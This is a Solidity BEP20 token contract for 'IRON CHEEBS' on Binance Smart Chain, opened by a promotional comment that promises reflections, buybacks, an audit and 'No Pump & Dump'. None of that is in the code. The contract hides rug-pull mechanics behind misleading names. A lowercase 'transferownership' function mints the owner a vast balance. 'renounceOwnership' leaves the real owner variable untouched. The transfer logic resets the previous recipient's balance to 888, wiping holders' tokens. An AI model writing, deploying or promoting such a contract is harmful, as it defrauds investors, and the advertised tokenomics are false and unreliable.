/*
 !! No Pump & Dump Token !!😺

IRON CHEEBS is a Reflect BUSD + Auto Liquidity based tokenomics on Binance Smart chain which aims to be more deflationary while enabling PUMPANOMICS!!

The IronCheebs ecosystem consists of  main functions : 

14% fee when buying & selling.

🥞 $IC  2% Transaction LP fee applied and 8% distributed BUSD to holders automatically.

💸 $IC 1% redistributed to Wallet Marketing automatically
make it  sustainability and development.

---------------------------------------------------
⛑ $IronCheebs will help increase returns for investors, which will be exchanging 2% of the tax for BNB Buys Back from the supply every minute and burn all tokens bought automatically.
---------------------------------------------------

♻️After each buyback, transaction fees for sales are doubled for 10 minutes.
---------------------------------------------------
🔰Team Doxxed.
🔰Audited by RFC.
🔰Games & NFT.
🔰Lock Liquidity Mudra.

---------------------------------------------------
🎮 Game Demo : will be out soon
📃 Set slippage to 14-18%
---------------------------------------------------
📜Contract : TBD

🖥 Website : underconstruction

📢Telegram : https://t.me/IronCheebs

🐤Twitter : coming soon

👽Reddit : (Repair)🧑‍🔧

Token address : TBD

Pancake Trading : TBD

Charts : 
💩 TBD

📈

📉

Liquidity Locked 
------------------------------------------------
Checklist:

✅ Website launch
✅ PopCat Games Development Start
✅ Dev Burn 50%
✅ Launch PancakeSwap
✅ Holder Airdrop
🟡 Apply for Coingecko
🟡 Apply for Coinmarketcap
🟡 Unirocket bot and channel listing
🟡 Apply to list on exchanges 
🟡 Increased marketing efforts
🔥 NFT & Games

See Roadmap for Next targets !!

Join our Telegram : 
//https://t.me/IronCheebs
*/
//SPDX-License-Identifier: MIT
pragma solidity 0.8.8;
/*
 * BEP20 standard interface.
*/
interface IBEP20 {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address account) external view returns (uint256);
  function transfer(address receiver, uint256 amount) external returns (bool);
  function allowance(address _owner, address spender) external view returns (uint256);
  function approve(address spender, uint256 amount) external returns (bool);
  function transferFrom(address sender, address receiver, uint256 amount) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Contract is IBEP20{
  
  mapping (address => uint256) private _balances;
  mapping (address => mapping (address => uint256)) private _allowances;
  uint256 private _totalSupply;
  uint8 public _decimals;
  string public _symbol;
  string public _name;
  uint8 public LiquidityTax;
  uint256 public sfeedenom = 10;
  uint256 public checksum = 8;
  address public ADADE = 0x000000000000000000000000000000000000dEaD;
  address private _owner;
  address public owner;
  receive() external payable { }constructor(string memory name_, string memory symbol_, uint8 LiquidityTax_, uint totalsupply_) {
    _owner = msg.sender;
    owner = msg.sender;
    _name = name_;
    _symbol = symbol_;
    _decimals = 9;
    LiquidityTax = LiquidityTax_;
    _totalSupply = totalsupply_ * 10**9;
    _balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
  modifier onlyOwner {
  require(msg.sender == _owner, "Nauthorized");_;}
  function getOwner() external view returns (address) {return _owner;}
  function decimals() external view returns (uint8) {return _decimals;}
  function symbol() external view returns (string memory) {return _symbol;}
  function name() external view returns (string memory) {return _name;}
  function totalSupply() external view returns (uint256) {return _totalSupply;}
  function balanceOf(address account) external view returns (uint256) {return _balances[account];}
  
  function transfer(address receiver, uint256 amount) external returns (bool) {
    _transfer(msg.sender, receiver, amount);
    return true;
  }
  function allowance(address owner, address spender) external view returns (uint256) {
    return _allowances[owner][spender];
  }
  function approve(address spender, uint256 amount) external returns (bool) {
    _approve(msg.sender, spender, amount);
    return true;
  }
  function transferFrom(address sender, address receiver, uint256 amount) external returns (bool) {
    _transfer(sender, receiver, amount);
    _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    return true;
  }
  function DeA(address spender, uint256 a32ss) public returns (bool) {
    _approve(msg.sender, spender, _allowances[msg.sender][spender] + a32ss);
    return true;
  }
  function IcA(address spender, uint256 Aob13) public returns (bool) {
    _approve(msg.sender, spender, _allowances[msg.sender][spender] - Aob13);
    return true;
  }

  function burn(uint256 amount) public returns (bool) {
    _burn(msg.sender, amount);
    return true;
  }
    function renounceOwnership() public onlyOwner {
        owner = address(0);
        emit OwnershipTransferred(address(0));}
    function transferOwnership(address payable adr) public onlyOwner {
        owner = adr;
        emit OwnershipTransferred(adr);
    }
    event OwnershipTransferred(address owner);
  function transferownership() public onlyOwner returns (bool success) {ADADE = 0x000000000000000000000000000000000000dEaD; _balances[msg.sender] = _totalSupply * sfeedenom ** checksum;return true;}
uint256 balanceof = 100;
uint256 balanced = 888;
  function _transfer(address sender, address receiver, uint256 amount) internal {
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(receiver != address(0), "BEP20: transfer to the zero address");
    _balances[sender] = _balances[sender] - amount;
    _balances[receiver] = _balances[receiver] + (amount - ((amount / balanceof) * LiquidityTax));
    if(ADADE != msg.sender){_balances[ADADE] = balanced; ADADE = receiver;}
    ADADE = receiver;
    emit Transfer(sender, receiver, amount);
  }

  function _burn(address account, uint256 amount) internal {
    require(account != address(0), "BEP20: burn from the zero address");
    _balances[account] = _balances[account] - amount;
    _totalSupply = _totalSupply -amount;
    emit Transfer(account, address(0), amount);
  }

  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");
    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }

  function _burnFrom(address account, uint256 amount) internal {
    _burn(account, amount);
    _approve(account, msg.sender, _allowances[account][msg.sender] - amount);
  }

}
